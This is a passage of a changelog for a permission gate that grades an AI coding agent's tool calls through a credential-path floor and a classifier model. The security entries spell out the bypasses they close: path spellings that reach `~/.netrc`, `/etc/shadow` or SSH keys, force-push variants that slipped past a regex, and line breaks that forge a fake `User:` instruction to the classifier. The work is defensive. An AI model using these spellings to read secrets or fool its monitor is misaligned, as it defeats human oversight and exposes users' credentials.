- A delimited path entry no longer hides a part from the built-in floor in any tool that takes a path list ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): omp splits every `read`, `grep`, `glob`, `ast_grep` and `ast_edit` entry at top-level `;`, `,` and whitespace (brace groups and backslash escapes are kept whole), and the gate now grades the parts of each entry, the `paths` array entries and the mutating `ast_edit` included. Before, `ast_edit` with `paths: ["src/x.ts;~/.config/glab-cli/config.yml"]` was a rule allow that rewrote a credential file with no model call and no human; the observing tools split only their single `path` field. A user `allow` regex now has to admit every part as well.
- **BREAKING**: a `read` of a relative path that does not exist is no longer a rule allow ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): omp reads a missing relative path from the unique workspace file that ends with the same path, so `read` of `id_ed25519` opens `.ssh/id_ed25519` in a project that holds one while the spelling grades as a harmless in-project name. Such a call, or a list with one such part, now reaches the classifier (headless: fail-closed deny), and no user `allow` rule or `tools` entry carries it. A target that exists (including one with a selector such as `:1-5,40-60`, a space or a comma in its name, or an image question), an absolute path, a directory and a session whose project directory does not exist keep their verdicts; a list is examined part by part only when the whole entry is missing.
- A `scheme://` lookalike no longer keeps its backslashes out of the floor's reading ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): the search tools turn every backslash into a slash, and the gate skipped that conversion for any text that began with `word://`, so `grep` of `a://..\..\.config\age\keys.txt` (a relative path to a credential file two directories up) was a rule allow. The exemption now covers only the schemes omp registers with its internal URL router (`skill`, `rule`, `memory`, `agent`, `history`, `artifact`, `local`, `proc`, `cfg`, `ssh`, `security`, `vault`, `issue`, `pr`, `mcp`, `omp`, `xd`, `attachment`, `conflict`).
- `glob` of a pattern that stays inside the project is a rule allow again ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): `glob` returns file names and never contents, so the wildcard rule that withholds the floor's allow from `grep`, `ast_grep` and `ast_edit` no longer applies to it when the literal prefix and every other graded form resolve inside the project directory and none hits a credential (S0) or git metadata (S3) rule. A declared `denyPaths` base at or under the prefix and a `.omp` directory under `gateOmpDir` still ask before the allow; a pattern that can leave the project (`../**`, `~/**`, `/etc/**`) or that is a `scheme://` URL (`ssh://host/etc/*`) stays gray; `grep`, `ast_grep` and `ast_edit` with a glob are unchanged. User `allow` rules and `tools` entries still skip a glob target.
- An image question no longer hides a credential file from the built-in floor ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): omp's `read` cuts `?q=<question>` (a question for a vision model) from every non-URL path and opens the rest, so `read` of `~/.netrc?q=x` was a rule allow for `~/.netrc`. `read` now also grades the path with the question peeled, alongside the selector peel, and `.env?q=x` and `key.pem?q=x` are denied like the plain names. A `?q=` with no value and a query on a `scheme://` URL are left alone, as in the host.
- **BREAKING**: a `read`, `grep`, `glob`, `ast_grep` or `ast_edit` target in one of omp's registered internal URL schemes (`ssh://`, `vault://`, `local://` and the rest of the list in the backslash fix above) is no longer a rule allow ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): a handler serves such a URL (a remote host, a vault), not the project file its text resolves to under the working directory, so `read` of `ssh://prod/etc/shadow` graded as an in-project name. The call is gray, reaches the classifier (headless: fail-closed deny), and no user `allow` rule or `tools` entry carries it.
- A shell-escaped path no longer hides a protected path from `read` ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): omp's `read` retries a missing path with a backslash before a space, quote, bracket or brace removed, so `read` of `~/Tax\ Returns/2025.pdf` opened `~/Tax Returns/2025.pdf` while grading as a different name and slipping past a `denyPaths` entry. `read` now also grades the unescaped form, and an existing file reached through an escaped spelling keeps its allow.

### Fixed

- `git-push-force` is now a shell-aware check, not a regex over the raw command (fork; 2026-10-04 path-layer review). Two inputs a raw-string regex got wrong: a legal refname may contain a shell separator, so `git push origin 'a&b' --force` slipped past the `[^;|&]*` class, and a commit message that merely quotes the pattern, `git commit -m '… git push --force …'`, was hard-denied even though the shell never runs it. `gitPushForce` splits the command into words and operators (`shellWords`) so quoting is respected — a quoted separator no longer splits the command, a quoted argument is not re-read as one, and a shell's own `-c` string is recursed into (`sh -c 'git push --force …'`, bounded depth) while `$(…)`/`(…)` become their own segments. Coverage kept: `git` reached through shell syntax (`/usr/bin/git`, `$(git …)`, `(git …)`), a short-flag bundle (`-f`, `-fu`, `-uf`) and a `-c`/`-C` global option before `push`. Flag recognition is explicit: `--force-with-lease[=ref]` is the only escaping `--force-*` spelling; every other `--force-*` form, including an invented `--force-something`, stays denied (the previous `--force(?![-\w])` lookahead exempted them all). Pinned by `git push force-flag precision` and `gitPushForce shell-word view`.
- Follow-up to the `git-push-force` shell-aware rewrite above (same 2026-10-04 review, audit F4, ADR-0007): coverage is now **monotone**. The word view replaced the old raw-string regex with a less faithful shell model, so spellings the regex caught (or that neither caught) became **bypasses**: `$( … )` inside double quotes, `eval`, the `env -S` split-string forms, a `sh -c` template forwarding `$1`/`$0`/`${N}`/`"$@"`, recursion past the depth cap, a backtick substitution, `bash -o pipefail -c` (and `sh -O … -c`, `bash --rcfile x -c`), a shell option the scanner does not model, `-f>file`, and the `+` refspec form (`git push origin +main`). The rule is now a **raw-text tripwire** that decides every hit (push-anchored, flexible body, terminated by a bare `--force`, another `--force-*` form — only `--force-with-lease` exempt — a bundled short `f` flag, or a `+` refspec; continuation-tolerant) plus a sound-gated word view that may only **clear** a hit, never be the sole path to one. A construct the scanner cannot resolve faithfully emits an unsound sentinel that keeps the deny; the tripwire's deny reason is unchanged and accurate. `--force-if-includes` alone is excluded (a no-op without a lease) and now reaches the classifier, as a lease does. Pinned by the `monotone floor` tests and the `force-push` probe family.
- The two fork S0 XDG entries are anchored to the user's home (fork; 2026-10-04 path-layer review): `~/.config/(gnupg|age|sops)` and `~/.config/glab-cli` were written as segment-anywhere patterns like their neighbours, so any path containing `.config/age` — a repository shipping `.config/age/data`, or a component spelled `foo.config/age` — was hard-denied on read and write. An XDG credential home lives at exactly `<home>/.config/<name>`, so the pattern is built from the home's lexical and realpath forms in rule form; the sibling dot entries (`.ssh`, `.aws`, `.gnupg`, `.config/gh`) keep the established segment-anywhere discipline. Pinned by the `S0 credential inventory` tests.
- The path-sensitivity floor and the self-protection checks now also test the **kernel-true** form of a spelling a host may open verbatim (fork; 2026-10-04 path-layer review item 4). `path.resolve` collapses `..` lexically, but the kernel resolves a symlink component first: with `link -> /`, `link/../x` opens `/x` while `path.resolve` names `<dir>/x`. pi resolves every input through `path.resolve`, so the case is moot there; omp's `resolveToCwd` returns an **absolute** input verbatim to the filesystem, so an absolute spelling could reach a credential path (S0) or the gate's own files while the floor saw a safe lexical path. `kernelForms(rawPath, cwd)` walks the spelling component by component, resolving symlinks as it descends and applying `..` to the already-resolved parent, and is added to `classifyPath`, the protected write/read checks and the S0 forms; it is skipped unless the spelling contains `..` (`denyPaths` keeps its ADR-0002 base tier). Pinned by `symlink component before .. still hits S0` and `a symlink component before .. cannot reach the policy`, which fail with `kernelForms` disabled.
- The kernel walk is now separator-correct and resolves leaf symlinks (fork; 2026-10-04 path-layer review items 7–8). Its component split treated a backslash as a separator, so on POSIX a filename containing one (`link\name` → `/`) walked as two components and the floor saw `<dir>/link/etc/hosts` where the kernel opens `/etc/hosts` (item 7; POSIX now splits on `/` only, win32 keeps both separators). And the walk only ran for spellings containing `..`, so a leaf symlink with no realpath — a dangling link or a self-referential loop — was graded on its lexical spelling alone: a write through a dangling link resolving into a protected file graded as a plain in-cwd allow. `kernelForms` is rebuilt on a shared `kernelWalk(rawPath, cwd)` → `{ resolved, unresolved }` that also runs when the leaf itself is a symlink (`lstat`-detected), expands links via `readlink` with an 8-hop budget, and marks a loop or unreadable link target unresolved; `classifyPath` fails such writes closed (`unresolved symlink (write fail-closed)`) through the `D(...)` downgrade, so `builtinDenyFloor: false` degrades it to gray like every other floor branch (plan-review F20), while reads stay alone (the open fails `ELOOP` anyway). Pinned by the `kernel walk` test block and the `kernel-path` probe family (items 7–8).
- The two home-anchored S0 entries now also cover a custom `XDG_CONFIG_HOME` (fork; 2026-10-04 path-layer review item 9, plan-review F15). `XDG_CONFIG_HOME` **replaces** `~/.config` — it does not nest under it — so with it set, `$XDG_CONFIG_HOME/gnupg/pubring.kbx`, `age/key.txt`, `sops/age/keys.txt`, `glab-cli/config.yml` and `gh/config.yml` sat entirely outside S0 (a non-S1 read is a deterministic allow). The two entries become unions over the home roots and `XDG_CONFIG_ROOTS` (lexical + realpath rule forms of `$XDG_CONFIG_HOME`; an empty or relative value is ignored, as the XDG spec requires; unset → the home-only patterns are byte-identical to before): `gnupg|age|sops` in both branches, `gh` in the XDG branch only — the sibling segment-anywhere `.config/gh` entry already covers the non-XDG spelling. `GNUPGHOME` stays the recorded `deliberate` case. Module-load evaluation would otherwise make this untestable under `bun test`, so `setXdgConfigRootsForTests` (mirroring `setTmpdirBasesForTests`) rebuilds the two regexes; the app-level honouring of `XDG_CONFIG_HOME` by these tools is unverified, and anchoring is the conservative direction. Pinned by the `XDG config root` tests and the five `XDG …` probe cases (item 9).
- `denyPaths` and user-rule path targets now also compare the **kernel-true** spelling for `..`-spellings (fork; 2026-10-04 path-layer review item 10, plan-review F11; ADR-0002 amendment). omp's file tools return an absolute input verbatim to the filesystem, so `subLink/../secret` (link → `<root>/protected/sub`) opens `<root>/protected/secret` while `path.resolve` names `<proj>/secret` — a lexical-only comparison let a symlink-then-`..` spelling evade both a `denyPaths` declaration and a user `deny` regex anchored on the real path. `denyPathForms` (declaration anchoring and candidates alike) and `userRuleTargets` gain `baseForms(kernelPath(...))`; the no-ancestor-rebuild rule is unchanged. User-rule semantics become asymmetric: **deny = any target matches, allow = every target matches** — an allow regex that matches only the lexical spelling must not allow the call. Pinned by the `denyPaths + user rules kernel tier` tests (3 of 4 fail before) and the `symlink before .. evaded it` / `user deny on the kernel path` probe cases.

UI notifications are unchanged; the wrapper adds no protected-path plaintext (ADR-0002).
- Gray-zone adjudication no longer fail-closes on models whose provider rejects the `temperature` parameter (#47): current-gen Anthropic models (`claude-sonnet-5`, `claude-opus-5`, `claude-opus-4-8`) answer the classifier's `temperature: 0` with a 400, denying every call whether set as `classifierModel` or reached via the session-model fallback. A rejection that mentions the parameter is now retried once without it at the same tier and the model is remembered until the extension reloads; models that accept the parameter keep the `temperature: 0` determinism pin.

## [0.5.1] - 2026-09-01

### Security

- S-rules (S0–S3) now match case-insensitively and S1 gains the macOS firmlink prefixes (`/private/etc`, `/private/var`): on case-insensitive filesystems (default macOS APFS, Windows) case variants name the same file but previously missed the case-sensitive regexes when the target did not exist (realpath cannot normalize a nonexistent path), and firmlink real spellings silently allowed where the `/etc` spelling went gray. denyPaths comparison folds case on darwin/win32 (linux stays case-sensitive) (#21)
- Path sensitivity floor (S0–S5) and the self-protection write check now match every canonical form of the target path (lexical + realpath, rebuilding from the nearest existing ancestor when the target does not exist yet); the in-cwd write allowance requires all forms to sit inside the session cwd's real path. Fixes a symlink-alias bypass where a single classifier-adjudicated `ln -s` aliasing `~/.ssh` or a `.git/hooks` directory let subsequent reads and cwd-scoped writes through the floor with zero model calls (#20)
- Classifier transcript lines are now line-break-escaped and the tool-call path branch goes through the same sanitize pipeline as commands (zero-width stripping + length cap). A path, command, or user message containing embedded line breaks could previously split its transcript line and forge structural lines — e.g. a fake `User:` line instructing the classifier to allow — and tool arguments are model-generated (steerable by prompt-injected file contents), so the surface was real. The escape covers `\n`, `\r\n`, lone `\r` and the Unicode separators U+2028/U+2029/U+0085, which models may render as breaks (#22)

### Changed

- Documentation alignment (#23): classifier timeout documented as 25s (en/zh READMEs; code and the measured p90 basis say 25s, docs said 15s); the volatile offline-test count removed from the dev section; the Status & limitations sections now state two floor scope boundaries explicitly — bash command strings are matched by the danger regexes only (`cat ~/.ssh/id_rsa` goes to the classifier, not the deterministic S0 deny), and on Windows the built-in floor covers bash-shaped patterns only, PowerShell-native dangerous commands rely on the classifier
